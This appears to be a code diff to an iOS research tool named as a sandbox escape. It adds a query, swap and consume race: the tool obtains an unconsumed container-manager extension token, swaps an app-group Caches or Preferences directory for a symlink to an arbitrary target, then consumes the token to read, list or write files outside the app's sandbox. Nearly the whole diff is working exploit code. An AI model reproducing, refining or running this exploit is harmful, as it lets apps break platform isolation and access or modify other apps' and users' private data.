@@ -27,7 +27,7 @@ extern ssize_t fsgetpath(char *buf, size_t bufsize, fsid_t *fsid, uint64_t objid
 #import <sys/stat.h>
 #import <unistd.h>
 
-#define P160_BUILD @"p160-sandbox-escape-v2b-partpath"
+#define P160_BUILD @"p160-sandbox-escape-v2c-query-swap-consume"
 #define P160_MG_GROUP "systemgroup.com.apple.mobilegestaltcache"
 #define P160_FLAGS UINT64_C(0x8100000000)
 
@@ -153,6 +153,49 @@ static int64_t p160_query(uint64_t cls, const char *ident, BOOL group,
     if (g.query_free) g.query_free(q);
     if (pathOut) *pathOut = path;
     return h;
+}
+
+/* v2c: query and return the UNCONSUMED extension token. The caller swaps the
+   part path to a symlink after this returns and only then consumes it —
+   P116's issue -> swap -> consume shape. The token is sensitive: callers
+   zero/free it and never log it. */
+static char *p160_query_token(uint64_t cls, const char *ident, BOOL group,
+                              uint64_t part, NSString *domain,
+                              NSString **pathOut, NSString **errOut) {
+    if (!p160_load()) { if (errOut) *errOut = @"MCM unavailable"; return NULL; }
+    void *q = g.create();
+    if (!q) { if (errOut) *errOut = @"query_create NULL"; return NULL; }
+    g.set_class(q, cls);
+    void *x = g.xpc_str(ident);
+    if (group && g.set_group_ids) g.set_group_ids(q, x);
+    else if (!group && g.set_ids) g.set_ids(q, x);
+    if (g.set_part) g.set_part(q, part);
+    if (domain.length && g.set_domain) g.set_domain(q, domain.UTF8String);
+    if (g.set_flags) g.set_flags(q, g_p160_flags);
+    if (x && g.xpc_rel) g.xpc_rel(x);
+
+    void *res = g.get_one(q);
+    NSString *path = nil;
+    if (res && g.get_path) {
+        const char *cp = g.get_path(res);
+        if (cp) path = [NSString stringWithUTF8String:cp];
+    }
+    char *tok = (res && g.copy_token) ? g.copy_token(res) : NULL;
+    if (!res && errOut) {
+        NSString *why = @"no result";
+        if (g.last_error) {
+            void *e = g.last_error(q);
+            if (e) {
+                int posix = g.err_posix ? g.err_posix(e) : 0;
+                const char *msg = g.err_message ? g.err_message(e) : NULL;
+                why = [NSString stringWithFormat:@"posix=%d %s", posix, msg ?: "(null)"];
+            }
+        }
+        *errOut = why;
+    }
+    if (g.query_free) g.query_free(q);
+    if (pathOut) *pathOut = path;
+    return tok;
 }
 
 static BOOL p160_can_open(NSString *path, BOOL dir) {
@@ -442,7 +485,7 @@ typedef NS_ENUM(int, p160_c7_mode) {
     p160_c7_write = 2,
 };
 
-static long p160_class7_op(NSString *target, int mode, NSMutableString *o, NSString **errOut) {
+static long __attribute__((unused)) p160_class7_op(NSString *target, int mode, NSMutableString *o, NSString **errOut) {
     if (!p160_load() || !g.set_ids) {
         if (errOut) *errOut = @"MCM unavailable";
         return -1;
@@ -550,6 +593,145 @@ static long p160_class7_op(NSString *target, int mode, NSMutableString *o, NSStr
             }
             g_p160_flags = P160_FLAGS;
             p160_restore_part(partPath, wasDir);
+        }
+    }
+    [o appendFormat:@"  [v2] miss %@ err=%@\n", target, last];
+    if (errOut) *errOut = last;
+    return -1;
+}
+
+/* v2c: the correct class-7 order. Query the group's REAL part directory,
+   take the unconsumed token, THEN swap the part path to a symlink to the
+   target, THEN consume, and open the part path. The MCM resolves the part
+   path at query time; a symlink created before the query is replaced by the
+   real directory (the live 17 EISDIR), so the v2b order cannot work. */
+static long p160_class7_op2(NSString *target, int mode, NSMutableString *o, NSString **errOut) {
+    if (!p160_load() || !g.set_ids) {
+        if (errOut) *errOut = @"MCM unavailable";
+        return -1;
+    }
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSString *last = @"no provisioned app group";
+    for (NSString *gid in p160_group_candidates()) {
+        NSURL *u = [fm containerURLForSecurityApplicationGroupIdentifier:gid];
+        if (!u) continue;
+        NSString *lib = [u.path stringByAppendingPathComponent:@"Library"];
+        int major = (int)[NSProcessInfo processInfo].operatingSystemVersion.majorVersion;
+        BOOL alt = (major == 26) &&
+            [target containsString:@"/var/mobile/Containers/Shared/AppGroup"];
+        NSArray<NSNumber *> *flags = alt
+            ? @[@(UINT64_C(0x800000000)), @(UINT64_C(0x8000000000)), @(P160_FLAGS)]
+            : @[@(UINT64_C(0x8000000000)), @(UINT64_C(0x800000000)), @(P160_FLAGS)];
+        for (NSNumber *partNum in @[@3, @2]) {
+            uint64_t part = partNum.unsignedLongLongValue;
+            NSString *leaf = part == 3 ? @"Caches" : @"Preferences";
+            NSString *partPath = [lib stringByAppendingPathComponent:leaf];
+            [fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:nil];
+            /* Query time needs a REAL directory here. */
+            [fm removeItemAtPath:partPath error:nil];
+            [fm createDirectoryAtPath:partPath withIntermediateDirectories:NO
+                            attributes:nil error:nil];
+            BOOL queried = NO;
+            for (NSNumber *flagNum in flags) {
+                g_p160_flags = flagNum.unsignedLongLongValue;
+                NSString *path = nil, *err = nil;
+                char *tok = p160_query_token(7, gid.UTF8String, YES, part,
+                                             @"", &path, &err);
+                if (!tok) {
+                    if (err.length) last = err;
+                    continue;
+                }
+                queried = YES;
+                /* Swap AFTER the query. The token is for the part path string. */
+                [fm removeItemAtPath:partPath error:nil];
+                if (symlink(target.fileSystemRepresentation,
+                            partPath.fileSystemRepresentation) != 0) {
+                    int e = errno;
+                    memset(tok, 0, strlen(tok)); free(tok);
+                    [fm createDirectoryAtPath:partPath withIntermediateDirectories:NO
+                                    attributes:nil error:nil];
+                    last = [NSString stringWithFormat:@"symlink %@ failed errno=%d", partPath, e];
+                    g_p160_flags = P160_FLAGS;
+                    continue;
+                }
+                int64_t h = g.consume ? g.consume(tok) : -1;
+                memset(tok, 0, strlen(tok)); free(tok);
+                g_p160_flags = P160_FLAGS;
+                if (h <= 0) {
+                    [fm removeItemAtPath:partPath error:nil];
+                    [fm createDirectoryAtPath:partPath withIntermediateDirectories:NO
+                                    attributes:nil error:nil];
+                    last = @"consume failed";
+                    continue;
+                }
+                long result = -1;
+                int opErr = 0;
+                if (mode == p160_c7_read) {
+                    int fd = open(partPath.fileSystemRepresentation, O_RDONLY);
+                    if (fd >= 0) {
+                        uint8_t buf[64];
+                        ssize_t n = read(fd, buf, sizeof buf);
+                        if (n > 0) {
+                            NSMutableString *hx = [NSMutableString string];
+                            for (ssize_t i = 0; i < n; i++) [hx appendFormat:@"%02x ", buf[i]];
+                            [o appendFormat:@"  [v2] path read %@ — %ld bytes @part=%@ @obj=%@\n    %@\n",
+                                target, (long)n, partPath, path ?: @"(null)", hx];
+                            result = (long)n;
+                        }
+                        close(fd);
+                    } else {
+                        opErr = errno;
+                    }
+                } else if (mode == p160_c7_list) {
+                    int n = 0;
+                    DIR *d = opendir(partPath.fileSystemRepresentation);
+                    if (d) {
+                        struct dirent *e;
+                        while ((e = readdir(d)) != NULL && n < 128) {
+                            if (strcmp(e->d_name, ".") == 0 || strcmp(e->d_name, "..") == 0) continue;
+                            [o appendFormat:@"    [v2] dir: %s\n", e->d_name];
+                            n++;
+                        }
+                        closedir(d);
+                        opErr = 0;
+                    } else {
+                        opErr = errno;
+                    }
+                    [o appendFormat:@"  [v2] dir %@ — %d entries @part=%@ @obj=%@\n",
+                        target, n, partPath, path ?: @"(null)"];
+                    result = (opErr == 0) ? n : -1;
+                } else {
+                    int fd = open(partPath.fileSystemRepresentation,
+                                  O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                    long wrote = -1;
+                    if (fd >= 0) {
+                        const char *msg = "p160 group write probe\n";
+                        ssize_t w = write(fd, msg, strlen(msg));
+                        if (w > 0) { fsync(fd); wrote = (long)w; }
+                        opErr = errno;
+                        close(fd);
+                    } else {
+                        opErr = errno;
+                    }
+                    [o appendFormat:@"  [v2] write %@ — write=%ld errno=%d @part=%@ @obj=%@\n",
+                        target, wrote, opErr, partPath, path ?: @"(null)"];
+                    result = wrote;
+                }
+                if (g.release) g.release(h);
+                [fm removeItemAtPath:partPath error:nil];
+                [fm createDirectoryAtPath:partPath withIntermediateDirectories:NO
+                                attributes:nil error:nil];
+                if (result >= 0) return result;
+                [o appendFormat:@"  [v2] part2 %@ flag=0x%llx errno=%d\n",
+                    partPath, (unsigned long long)flagNum.unsignedLongLongValue, opErr];
+                last = [NSString stringWithFormat:@"part=%@ errno=%d", partPath, opErr];
+            }
+            if (!queried) {
+                [o appendFormat:@"  [v2] part %@ no token err=%@\n", partPath, last];
+            }
+            [fm removeItemAtPath:partPath error:nil];
+            [fm createDirectoryAtPath:partPath withIntermediateDirectories:NO
+                            attributes:nil error:nil];
         }
     }
     [o appendFormat:@"  [v2] miss %@ err=%@\n", target, last];
@@ -867,12 +1049,12 @@ static void p160_pathleak(NSString *prefix, uint64_t maxInode, NSMutableString *
             [docs stringByAppendingPathComponent:@"p160_path.txt"]
             encoding:NSUTF8StringEncoding error:nil]
             stringByTrimmingCharactersInSet:ws];
-        if (p.length) (void)p160_class7_op(p, p160_c7_read, o, NULL);
+        if (p.length) (void)p160_class7_op2(p, p160_c7_read, o, NULL);
         NSString *dr = [[NSString stringWithContentsOfFile:
             [docs stringByAppendingPathComponent:@"p160_dir.txt"]
             encoding:NSUTF8StringEncoding error:nil]
             stringByTrimmingCharactersInSet:ws];
-        if (dr.length) (void)p160_class7_op(dr, p160_c7_list, o, NULL);
+        if (dr.length) (void)p160_class7_op2(dr, p160_c7_list, o, NULL);
         NSString *wr = [[NSString stringWithContentsOfFile:
             [docs stringByAppendingPathComponent:@"p160_write_target.txt"]
             encoding:NSUTF8StringEncoding error:nil]
@@ -881,7 +1063,7 @@ static void p160_pathleak(NSString *prefix, uint64_t maxInode, NSMutableString *
             if (!([wr hasPrefix:@"/var/mobile/"] || [wr hasPrefix:@"/private/var/mobile/"])) {
                 [o appendFormat:@"  [v2] write refused %@ (target must be under /var/mobile)\n", wr];
             } else {
-                (void)p160_class7_op(wr, p160_c7_write, o, NULL);
+                (void)p160_class7_op2(wr, p160_c7_write, o, NULL);
             }
         }
     }
